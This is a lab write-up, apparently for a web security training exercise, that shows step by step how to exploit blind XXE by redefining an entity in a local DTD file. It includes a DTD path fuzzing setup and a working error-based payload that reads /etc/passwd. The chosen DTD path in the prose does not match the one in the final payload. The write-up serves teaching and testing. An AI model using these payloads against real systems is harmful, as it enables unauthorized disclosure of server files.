# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

 This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it. 

**Hint**

*Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.*

# Note

This lab gives the location of a local DTD file, but in a case where this is unknow a list of potential local DTD file locations can be found using the lists from dtd-finder from GoSecure found here: https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt. I am going to complete the lab as if the hint did not exist.

# Step 1 Find XML being parsed 

I find it on the "Check Stock" POST request being sent to /product/stock

![image](https://user-images.githubusercontent.com/83407557/210463592-c6353faf-c1a9-4cf0-8599-d748d3d7e627.png)

# Step 2 Find local DTD file

I want to send this request to intruder with the following XXE to find a local file:

```xml
<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file://PATH-TO-FILE">%local_dtd;]>
```

I set the payload position to PATH-TO-FILE

![image](https://user-images.githubusercontent.com/83407557/210464251-4e44528a-1f78-4722-9a05-f6e7e7037319.png)

For payloads I use the dtd-finder file list:

```bash
└─$ cat dtd-finder/list/dtd_files.txt|xclip -selection clipboard
```

![image](https://user-images.githubusercontent.com/83407557/210464373-e26ce5d4-7a24-445c-b8ac-8e11f23e2370.png)

I also have to make sure the payloads are not being url encoded:

![image](https://user-images.githubusercontent.com/83407557/210464583-7eab929b-fed7-4530-a566-c94c31b18bc5.png)

Launching the attack I find 5 DTD files

![image](https://user-images.githubusercontent.com/83407557/210464680-3160d150-6ed7-412d-9a91-e15e9b2e5ba4.png)

# Step 3 locate and ENTITY within one of the found DTD files

Since I am also running linux, I just check my own local DTD file for entity names:

```bash
└─$ cat /usr/share/yelp/dtd/docbookx.dtd|grep ENTITY          
<!ENTITY % ISOamsa PUBLIC
<!ENTITY % ISOamsb PUBLIC
<!ENTITY % ISOamsc PUBLIC
<!ENTITY % ISOamsn PUBLIC
<!ENTITY % ISOamso PUBLIC
<!ENTITY % ISOamsr PUBLIC
<!ENTITY % ISObox PUBLIC
<!ENTITY % ISOcyr1 PUBLIC
<!ENTITY % ISOcyr2 PUBLIC
<!ENTITY % ISOdia PUBLIC
<!ENTITY % ISOgrk1 PUBLIC
<!ENTITY % ISOgrk2 PUBLIC
<!ENTITY % ISOgrk3 PUBLIC
<!ENTITY % ISOgrk4 PUBLIC
<!ENTITY % ISOlat1 PUBLIC
<!ENTITY % ISOlat2 PUBLIC
<!ENTITY % ISOnum PUBLIC
<!ENTITY % ISOpub PUBLIC
<!ENTITY % ISOtech PUBLIC

```

# Step 4 craft XXE payload

Then picking one of the entities `% ISOamsa` and the file-path `/usr/share/yelp/dtd/docbookx.dtd` I craft an error based XXE payload to grab the /etc/passwd file:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/schema/xml-core/catalog.dtd">
<!ENTITY % ISOamsa '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

Which errors out and leaks the /etc/passwd file:

![image](https://user-images.githubusercontent.com/83407557/210466701-d827e4e3-c5cb-4a85-a4f9-8c24755d1a11.png)

Take note, any of the found ENTITIES would have worked:

![image](https://user-images.githubusercontent.com/83407557/210466811-2990a3f8-2f99-4e40-b32c-2bca16b4878f.png)


With this the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/210466853-bb289426-fb7e-4eb8-acdf-e85a3707f505.png)
